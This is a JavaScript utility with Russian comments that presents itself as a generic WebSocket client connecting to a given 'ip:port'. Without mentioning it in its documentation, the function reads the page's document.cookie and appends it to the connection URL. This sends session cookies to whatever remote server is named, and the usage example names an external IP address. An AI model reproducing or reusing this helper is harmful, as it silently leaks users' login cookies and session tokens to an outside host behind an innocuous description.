class WebSocketClientError extends Error {
    constructor(message, statusCode) {
        super(message);
        this.name = this.constructor.name;
        this.statusCode = statusCode;
        Error.captureStackTrace(this, this.constructor);
    }
}

/**
 * Создаёт WebSocket клиент для подключения к серверу.
 *
 * @param {string} ip - IP-адрес сервера в формате '123.123.123.123:12345'.
 * @param {function(string): void} callbackHandlerResponse - Функция-обработчик для обработки входящих сообщений от сервера.
 *                                                         - Принимает Данные, полученные от сервера.
 * @param {function(WebSocket): void} callbackHandlerRequest - Функция-обработчик, которая вызывается после успешного подключения к серверу.
 *                                                           - Принимает Объект WebSocket, представляющий текущее соединение.
 *
 * @throws {WebSocketClientError} Если параметр `ip` не является строкой.
 * @throws {WebSocketClientError} Если `callbackHandlerResponse` не является функцией.
 * @throws {WebSocketClientError} Если `callbackHandlerRequest` не является функцией.
 * @throws {WebSocketClientError} Если `ip` не соответствует шаблону '123.123.123.123:12345'.
 *
 * @example
 * // Пример использования
 * websocketClient("95.109.169.148:8080",
 *   (data) => { // Обработчик ответа
 *       console.log("Получено сообщение:", data);
 *   },
 *   (ws) => { // Обработчик запроса
 *       console.log("Запрос к серверу выполнен", ws);
 *   });
 */
function websocketClient(ip, callbackHandlerResponse, callbackHandlerRequest) {
    if (typeof ip !== "string") {
        throw new WebSocketClientError("Invalid IP address for websocket client");
    }

    if (typeof callbackHandlerResponse !== "function") {
        throw new WebSocketClientError("Invalid callbackHandlerResponse for websocket client");
    }

    if (typeof callbackHandlerRequest !== "function") {
        throw new WebSocketClientError("Invalid callbackHandlerRequest for websocket client");
    }

    const ipPortPattern = /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/;
    if (!ipPortPattern.test(ip)) {
        throw new WebSocketClientError(
            "Параметр ip не соответствует шаблону (123.123.123.123:12345)"
        );
    }

    const cookies = encodeURIComponent(document.cookie); // Кодируем куки
    const ws = new WebSocket("ws://" + ip + "?cookies=" + cookies);
    ws.onopen = () => {
        console.log("Соединение установлено с сервером");
    };

    ws.onmessage = (event) => {
        callbackHandlerResponse(event.data);
    };

    ws.onclose = () => {
        console.log("Соединение закрыто");
    };

    callbackHandlerRequest(ws);
}
